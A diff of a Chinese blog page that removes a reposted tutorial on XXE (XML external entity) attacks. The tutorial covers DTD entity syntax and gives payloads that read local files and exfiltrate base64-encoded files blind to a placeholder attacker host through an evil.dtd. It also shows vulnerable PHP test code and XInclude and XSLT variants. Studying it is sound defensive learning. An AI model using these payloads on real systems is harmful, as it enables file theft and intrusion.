-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/30/xxe学习/" class="post-title-link" itemprop="url">xxe学习</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-
-          
-          
-          
-
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-07-30 19:52:13 / 修改时间：20:07:46" itemprop="dateCreated datePublished" datetime="2019-07-30T19:52:13+08:00">2019-07-30</time>
-            </span>
-          
-
-          
-            
-
-            
-          
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          <br>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="XXE学习之路-STEP-BY-STEP"><a href="#XXE学习之路-STEP-BY-STEP" class="headerlink" title="XXE学习之路-STEP BY STEP"></a>XXE学习之路-STEP BY STEP</h2><p><img src="https://image.3001.net/images/20190428/1556414288_5cc4ff50285e3.jpg" alt="img"><a href="https://www.freebuf.com/author/漏斗社区" target="_blank" rel="noopener">漏斗社区</a>2017-12-11 </p>
-<p>首发专栏：<a href="http://zhuanlan.freebuf.com/column/index/?name=潜心学习的小白帽" target="_blank" rel="noopener">潜心学习的小白帽</a>关注</p>
-<p>近期看到OWASP TOP 10 2017 版中添加了XXE的内容便对XXE的一些知识进行梳理和总结。</p>
-<p><strong>0×00 背景</strong></p>
-<p>近期看到OWASP TOP 10 2017 版中添加了XXE的内容便对XXE的一些知识进行梳理和总结，XXE可以使用例如http，file等协议，所以可以利用支持的协议进行内网探测和内网入侵，这部分的内容后续在SSRF中补充。</p>
-<p>要点：libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 ), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。 </p>
-<p>参考链接：</p>
-<p><a href="http://vulhub.org/#/environments/php_xxe/" target="_blank" rel="noopener">http://vulhub.org/#/environments/php_xxe/</a></p>
-<p>有回显有报错测试代码：</p>
-<blockquote>
-<p>1.&lt;?php</p>
-<p>2.$xml=simplexml_load_string($_POST[‘xml’]);</p>
-<p>3.print_r($xml);</p>
-<p>4.?&gt;</p>
-</blockquote>
-<p>无回显无报错测试代码：</p>
-<blockquote>
-<p>1.&lt;?php</p>
-<p>2.$xml=@simplexml_load_string($_POST[‘xml’]);</p>
-<p>3.?&gt;</p>
-</blockquote>
-<p><strong>0×01 DTD的基础知识</strong></p>
-<p><strong>概念：</strong> </p>
-<p><strong>XXE：</strong>XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。</p>
-<p><strong>DTD：</strong>Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。 </p>
-<p><strong>参考链接：</strong><a href="http://www.w3school.com.cn/dtd/" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/</a></p>
-<p>首先了解下基本的PAYLOAD结构，然后再介绍每部分涉及的知识点，如下PAYLOAD开头进行了XML的声明，然后使用DTD声明实体(这里使用了file协议)，最后使用XML获取实体的数据。 </p>
-<p><strong>基本的PAYLOAD结构：</strong></p>
-<p><strong><img src="https://image.3001.net/images/20171211/15129732931168.png!small" alt="基本 PAY.png"></strong></p>
-<p><strong>使用DTD实体的攻击方式 ：</strong></p>
-<p><strong>DTD 引用方式(简要了解)：</strong></p>
-<p><strong>1. DTD 内部声明</strong></p>
-<!DOCTYPE 根元素 [元素声明]>
-
-<p><strong>2. DTD 外部引用</strong></p>
-<!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”>
-
-<p><strong>3. 引用公共DTD</strong></p>
-<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
-
-<p>示例：</p>
-<blockquote>
-<?xml version=”1.0″?><p>   </p>
-<!DOCTYPE configuration PUBLIC “-//mybatis.org//DTD Config 3.0//EN”
-
-“http://mybatis.org/dtd/mybatis-3-config.dtd”>
-
-<p>……</p>
-<p>命名方法：以!DOCTYPE开始,configuration是文档根元素名称；</p>
-<p>PUBLIC表示是公共DTD；-表示是非ISO组织；mybatis.org表示组织；</p>
-<p>DTD 表示类型；Config 表示标签；3.0是标签后附带的版本号；</p>
-<p>EN表示DTD语言是英语；最后是DTD的URL；</p>
-</blockquote>
-<p><strong>DTD 实体声明(重点学习)：</strong></p>
-<p><strong>1. 内部实体声明</strong></p>
-<!ENTITY 实体名称 “实体的值”><p> </p>
-<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p>
-<blockquote>
-<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
-<p>2.<!ENTITY xxe "Thinking">]&gt;</p>
-<p>3.<foo>&xxe;</foo></p>
-</blockquote>
-<p><a href="https://image.3001.net/images/20171211/15129734664946.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129734664946.png!small" alt="内部.png"></a></p>
-<p><strong>2. 外部实体声明</strong></p>
-<!ENTITY 实体名称 SYSTEM “URI/URL”><p> </p>
-<p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p>
-<p><a href="https://image.3001.net/images/20171211/15129735161149.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129735161149.png!small" alt="外部.png"></a></p>
-<p>示例：</p>
-<blockquote>
-<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
-<p>2.<!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]&gt;</p>
-<p>3.<foo>&xxe;</foo></p>
-</blockquote>
-<p><strong>3. 参数实体声明</strong></p>
-<blockquote>
-<p>1.<!ENTITY % 实体名称 “实体的值”></p>
-<p>2.or</p>
-<p>3.<!ENTITY % 实体名称 SYSTEM “URI”></p>
-</blockquote>
-<p>示例：</p>
-<blockquote>
-<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
-<p>2.<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" ></p>
-<p>3.%xxe;]&gt;</p>
-<p>4.<foo>&evil;</foo></p>
-</blockquote>
-<p>外部evil.dtd中的内容。</p>
-<blockquote>
-<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
-</blockquote>
-<p><a href="https://image.3001.net/images/20171211/15129736722870.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129736722870.png!small" alt="evil.png"></a></p>
-<p><strong>4. 引用公共实体</strong></p>
-<!ENTITY 实体名称 PUBLIC “public_ID” “URI”>
-
-
-
-<p><strong>0×02 XXE的利用方式-DTD</strong></p>
-<p><strong>使用DTD的利用方式</strong></p>
-<p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做了:-)</p>
-<p>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
-<p><strong>1. 有回显情况：</strong></p>
-<p>有回显的情况可以使用如下的两种方式进行XXE注入攻击。</p>
-<blockquote>
-<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
-<p>2.<!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]&gt;</p>
-<p>3.<foo>&xxe;</foo></p>
-</blockquote>
-<blockquote>
-<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
-<p>2.<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" ></p>
-<p>3.%xxe;]&gt;</p>
-<p>4.<foo>&evil;</foo></p>
-</blockquote>
-<p>外部evil.dtd中的内容。</p>
-<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
-
-<p><a href="https://image.3001.net/images/20171211/1512973900504.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/1512973900504.png!small" alt="001.png"></a></p>
-<p>当然也可以进行内网站点的入侵(属于SSRF的内容 后续补充)。</p>
-<p><a href="https://image.3001.net/images/20171211/15129739223096.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129739223096.png!small" alt="002.png"></a></p>
-<p><strong>2. 无回显的情况：</strong></p>
-<p>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p>
-<blockquote>
-<p>1.&lt;!DOCTYPE updateProfile [</p>
-<p>\2.  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php"></p>
-<p>\3.  <!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd"></p>
-<p>4.%dtd;</p>
-<p>5.%send;</p>
-<p>6.]&gt;</p>
-</blockquote>
-<p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
-<blockquote>
-<p>1.&lt;!ENTITY % all</p>
-<p>\2. “<!ENTITY &#x25; send SYSTEM ‘http://xxx.xxx.xxx/?data=%file;’>”</p>
-<p>\3. &gt;</p>
-<p>4.%all;</p>
-</blockquote>
-<p>有报错直接查看报错信息。</p>
-<p><a href="https://image.3001.net/images/20171211/15129740453963.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129740453963.png!small" alt="baocuo.png"></a></p>
-<p>无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
-<p><a href="https://image.3001.net/images/20171211/1512974092509.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/1512974092509.png!small" alt="wu  1.png"></a></p>
-<p><a href="https://image.3001.net/images/20171211/15129741091027.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129741091027.png!small" alt="wu 2.png"></a></p>
-<p><a href="https://image.3001.net/images/20171211/15129741255397.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129741255397.png!small" alt="wu 3.png"></a></p>
-<p><a href="https://image.3001.net/images/20171211/15129741458706.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129741458706.png!small" alt="wu 4.png"></a></p>
-<p><strong>XXE的拓展知识</strong></p>
-<p><strong>0×01 xmlns的基本知识</strong></p>
-<p>接下来说一些拓展的知识，这些攻击方式，需要有某些条件才能正常利用，下文仅对互联网上的一些知识进行梳理，暂未验证。</p>
-<p>概念： </p>
-<p><strong>XML Schema：</strong>称为可扩展标记语言架构，用来定义 XML 文档的合法构建模块，类似 DTD，Schema是DTD的替代者, 它比DTD可以做更多的事情 。</p>
-<p><strong>参考链接：</strong></p>
-<p><a href="http://www.w3school.com.cn/schema/schema_intro.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/schema/schema_intro.asp</a></p>
-<p>先说下xmlns，当有多个文档被一起使用时候不同文档可能带有不同内容和定义名称相同的元素，这样就会发生命名冲突，XML解释器无法确定如何处理这类冲突，而xmlns可以解决这个问题，我们为标签添加了一个 xmlns 属性，这样就为前缀赋予了一个与某个命名空间相关联的限定名称。此时再把它们放在一起，XML解析器就不会报错了。</p>
-<blockquote>
-<p>1.&lt;!– 这里xmlns:abc=”url”表示这个table是用abc作为标记，table的写法在url中定义 –&gt;</p>
-<p>2.&lt;abc:table xmlns:abc=”url”&gt;</p>
-<p>\3.  <a href="abc:tr" target="_blank" rel="noopener">abc:tr</a></p>
-<p>\4.    <a href="abc:td" target="_blank" rel="noopener">abc:td</a>Apples</p>
-<p>\5.    <a href="abc:td" target="_blank" rel="noopener">abc:td</a>Bananas</p>
-<p>\6.  </p>
-<p>7.</p>
-</blockquote>
-<p>语法：xmlns=”namespaceURI”表示默认的Namespace，可以不使用前缀；非默认的便需要使用前缀避免XML报错。 xmlns:namespace-prefix=”namespaceURI”，其中namespace-prefix为自定义前缀，只要在这个XML文档中保证前缀不重复即可；namespaceURI是这个前缀对应的XML Namespace的定义，如下例子中的xmlns:xsi表示使用xsi作为前缀的Namespace。</p>
-<p>xsi:schemaLocation属性便是Namespace为<a href="http://www.w3.org/2001/XMLSchema-instance里的schemaLocation属性。xsi:schemaLocation定义了XML" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance里的schemaLocation属性。xsi:schemaLocation定义了XML</a> Namespace和对应的 XSD（Xml Schema Definition）文档的位置的关系。它的值由一个或多个URI引用对组成，两个URI之间以空白符分隔（空格和换行均可）。第一个URI是定义的 XML Namespace的值，第二个URI给出Schema文档的位置，Schema处理器将从这个位置读取Schema文档，文档的targetNamespace必须与第一个URI相匹，具体内容如下所示：</p>
-<blockquote>
-<p>1.<?xml version=”1.0″?></p>
-<p>2.</p>
-<p>3.&lt;note xmlns=”<a href="http://www.runoob.com”" target="_blank" rel="noopener">http://www.runoob.com”</a></p>
-<p>4.xmlns:xsi=”<a href="http://www.w3.org/2001/XMLSchema-instance”" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance”</a></p>
-<p>5.xsi:schemaLocation=”<a href="http://www.springframework.org/schema/context" target="_blank" rel="noopener">http://www.springframework.org/schema/context</a></p>
-<p>\6.                    <a href="http://www.springframework.org/schema/context/spring-context.xsd”" target="_blank" rel="noopener">http://www.springframework.org/schema/context/spring-context.xsd”</a></p>
-<p>7.</p>
-<p>8.targetNamespace=”<a href="http://www.springframework.org/schema/context”" target="_blank" rel="noopener">http://www.springframework.org/schema/context”</a></p>
-<p>9…….</p>
-<p>10.</p>
-</blockquote>
-<p><strong>0×02 使用XML Schema 实体的攻击方式</strong></p>
-<p><strong>XML Schema攻击的分类</strong></p>
-<p>根据FB的小编对外文的翻译，得知XML Schema攻击分为：</p>
-<p>1.schemaLocation</p>
-<p>2.noNamespaceSchemaLocation</p>
-<p>3.XInclude。</p>
-<p>4.XSLT 攻击</p>
-<p><strong>1. schemaLocation</strong></p>
-<p>在OWASP 的XML External Entity Attacks(XXE)议题中有看到这这个知识点，但是具体的案例并未找到，FB给出了如下的示例。</p>
-<blockquote>
-<p>1.<?xml version=’1.0′?></p>
-<p>2.&lt;!DOCTYPE data [</p>
-<p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
-<p>4.%remote;</p>
-<p>5.]&gt;</p>
-<p>6.&lt;ttt:data xmlns:xsi=”<a href="http://www.w3.org/2001/XMLSchema-instance”" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance”</a></p>
-<p>\7.   xmlns:ttt=”<a href="http://test.com/attack”" target="_blank" rel="noopener">http://test.com/attack”</a></p>
-<p>\8. xsi:schemaLocation=”ttt <a href="http://publicServer.com/&internal;”&gt;4" target="_blank" rel="noopener">http://publicServer.com/&internal;”&gt;4</a></p>
-</blockquote>
-<p><strong>2. noNamespaceSchemaLocation</strong></p>
-<p>与<strong>schemaLocation</strong>一样，在OWASP 的XML External Entity Attacks(XXE)议题中有看到这个知识点，但是具体的案例并未找到，FB给出了如下的示例，也给出了SSRF的示例，但是在示例中总觉得有些诡异，这也是我疑惑的地方。</p>
-<blockquote>
-<p>1.<?xml version=’1.0′?></p>
-<p>2.&lt;!DOCTYPE data [</p>
-<p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
-<p>4.%remote;</p>
-<p>5.]&gt;</p>
-<p>6.&lt;data xmlns:xsi=”<a href="http://www.w3.org/2001/XMLSchema-instance”" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance”</a></p>
-<p>\7.    xsi:noNamespaceSchemaLocation=”<a href="http://publicServer.com/&internal;”&gt;" target="_blank" rel="noopener">http://publicServer.com/&internal;”&gt;</a></p>
-</blockquote>
-<p><strong>3. XInclude</strong></p>
-<p>XInclude在XML Schema, DTD, and Entity Attacks 的文档中有提到，但是经过测试和查阅材料，在微软的将 XML 文档与 XInclude 合并在一起这篇文档中有提到并不是所有XML 语法分析程序都支持 XInclude，W3C在XInclude Implementations Report中列出了支持的列表，include的href属性中可以进行文件读取，也可以使用协议进行SSRF，freebuf中是使用DTD实体的方式再结合XInclude进行利用的，似乎觉得有些不大贴切，因为如果可以使用XInclude的话那么就不需要使用DTD了，直接在href属性中利用协议获取信息，即可；但是FB这种在属性处使用&internal;的思路值得借鉴。</p>
-<p><strong>XML Schema, DTD, and Entity Attacks</strong>中的示例：</p>
-<p><a href="https://image.3001.net/images/20171211/15129745755040.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129745755040.png!small" alt="示例.png"></a></p>
-<p>freebuf的示例，如下所示：</p>
-<blockquote>
-<p>1.<?xml version=”1.0″ encoding=”utf-8″?></p>
-<p>2.&lt;!DOCTYPE data [</p>
-<p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
-<p>4.%remote;</p>
-<p>5.]&gt;</p>
-<p>6.<data xmlns:xi="”http://www.w3.org/2001/XInclude”">&lt;xi:include href=”<a href="http://192.168.2.31/&internal;”" target="_blank" rel="noopener">http://192.168.2.31/&internal;”</a> parse=”text”&gt;</data></p>
-</blockquote>
-<p>以上示例中<strong>external_entity_attribute.dtd</strong>文件的内容，根据示例中的参数实体payload的声明，在此处应该可以使用各种协议进行SSRF等操作。</p>
-<blockquote>
-<p>1.<!ENTITY % payload SYSTEM “file:///sys/power/image_size”></p>
-<p>2.<!ENTITY % param1 “<!ENTITY internal ‘%payload;’>”&gt;</p>
-<p>3.%param1;</p>
-</blockquote>
-<p><strong>4. XSLT 攻击</strong></p>
-<p>这个攻击方式在XML Out-Of-Band Data Retrieval有提到，可以通过如下的方式先用document()获得目标主机的信息，然后使用concat()将数据与evil主机进行拼接，然后document()访问拼接后的地址，便可以在evil主机日志上获得信息。 </p>
-<p>XSL中document() 用于访问外部 XML 文档中的节点；concat(string,string,…)用于返回字符串的拼接。</p>
-<p><a href="https://image.3001.net/images/20171211/1512974695640.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/1512974695640.png!small" alt="拼接.png"></a></p>
-<p><strong>0×03 总结</strong></p>
-<p>互联网上XXE的文章还是很多的，所以先进行知识的梳理，方便学习和提高，本文参考了互联网上各个师傅和前辈的文章进行总结和梳理，在拓展部分的知识还有许多地方还未进行实践和验证，仅是先做个记录方便后续完善和测试，大家如果已经复现过了或者有更好场景，期待一起交流，如下是撰写本文的参考链接。</p>
-<p>参考链接：</p>
-<p><a href="http://www.w3school.com.cn/dtd/dtd_intro.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/dtd_intro.asp</a></p>
-<p><a href="http://www.w3school.com.cn/schema/schema_summary.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/schema/schema_summary.asp</a></p>
-<p><a href="http://www.w3school.com.cn/xml/xml_usedfor.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/xml/xml_usedfor.asp</a></p>
-<p><a href="https://www.w3.org/XML/2002/09/xinclude-implementation" target="_blank" rel="noopener">https://www.w3.org/XML/2002/09/xinclude-implementation</a></p>
-<p><a href="http://www.runoob.com/xsl/xsl-browsers.html" target="_blank" rel="noopener">http://www.runoob.com/xsl/xsl-browsers.html</a></p>
-<p><a href="http://blog.csdn.net/sunxing007/article/details/5684265" target="_blank" rel="noopener">http://blog.csdn.net/sunxing007/article/details/5684265</a></p>
-<p><a href="http://blog.csdn.net/a19881029/article/details/41890347" target="_blank" rel="noopener">http://blog.csdn.net/a19881029/article/details/41890347</a></p>
-<p><a href="http://blog.csdn.net/zhch152/article/details/8191377" target="_blank" rel="noopener">http://blog.csdn.net/zhch152/article/details/8191377</a></p>
-<p><a href="http://xmlwriter.net/xml_guide/entity_declaration.shtml" target="_blank" rel="noopener">http://xmlwriter.net/xml_guide/entity_declaration.shtml</a></p>
-<p><a href="http://www.mamicode.com/info-detail-1208231.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-1208231.html</a></p>
-<p><a href="http://blog.csdn.net/u013224189/article/details/49759845" target="_blank" rel="noopener">http://blog.csdn.net/u013224189/article/details/49759845</a></p>
-<p><a href="http://www.91ri.org/17052.html" target="_blank" rel="noopener">http://www.91ri.org/17052.html</a></p>
-<p><a href="http://www.91ri.org/9539.html" target="_blank" rel="noopener">http://www.91ri.org/9539.html</a></p>
-<p><a href="http://www.91ri.org/12618.html" target="_blank" rel="noopener">http://www.91ri.org/12618.html</a></p>
-<p><a href="http://www.91ri.org/12814.html" target="_blank" rel="noopener">http://www.91ri.org/12814.html</a></p>
-<p><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</a></p>
-<p><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#PHP" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#PHP</a></p>
-<p><a href="http://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/126788.html</a></p>
-<p><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/97833.html</a></p>
-<p><a href="https://msdn.microsoft.com/zh-cn/library/aa302291.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/aa302291.aspx</a></p>
-<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
-<p><a href="http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf" target="_blank" rel="noopener">http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf</a></p>
-<p><a href="https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf</a></p>
-<p><a href="https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf</a></p>
-<p><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf</a></p>
-<p><a href="https://github.com/BuffaloWill/oxml_xxe/tree/master/samples" target="_blank" rel="noopener">https://github.com/BuffaloWill/oxml_xxe/tree/master/samples</a></p>
-<p><a href="https://github.com/CHYbeta/Web-Security-Learning#xxe" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning#xxe</a>(<a href="https://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1239375517" target="_blank" rel="noopener">https://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1239375517</a></p>
-<h3 id="转载自：https-www-freebuf-com-column-156863-html"><a href="#转载自：https-www-freebuf-com-column-156863-html" class="headerlink" title="转载自：https://www.freebuf.com/column/156863.html"></a>转载自：<a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">https://www.freebuf.com/column/156863.html</a></h3>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2531,7 +2531,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">21</span>
+                    <span class="site-state-item-count">22</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
